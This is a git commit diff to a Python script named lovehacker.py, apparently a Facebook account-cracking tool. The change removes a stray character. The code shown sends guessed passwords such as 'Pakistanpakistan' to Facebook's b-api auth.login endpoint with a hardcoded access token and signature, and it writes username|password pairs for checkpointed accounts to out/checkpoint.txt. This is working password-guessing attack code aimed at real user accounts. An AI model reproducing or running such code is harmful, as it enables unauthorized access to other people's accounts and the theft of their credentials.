8572a658d64fbcd181e7f859812e19e2ba6c794c
adilffm <56082276+adilffm@users.noreply.github.com>
2020-05-17 18:23:33 +0500

    lovehacker.py

--- lovehacker.py
+++ lovehacker.py
@@ -550,7 +550,7 @@ def pilih_super():
 																					cek = open("out/checkpoint.txt", "a")
 																					cek.write(user+"|"+pass10+"\n")
 																					cek.close()
-																					cekpoint.append(user+pass10)f
+																					cekpoint.append(user+pass10)
 																				else:
     																					pass11 = 'Pakistanpakistan'
 																					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
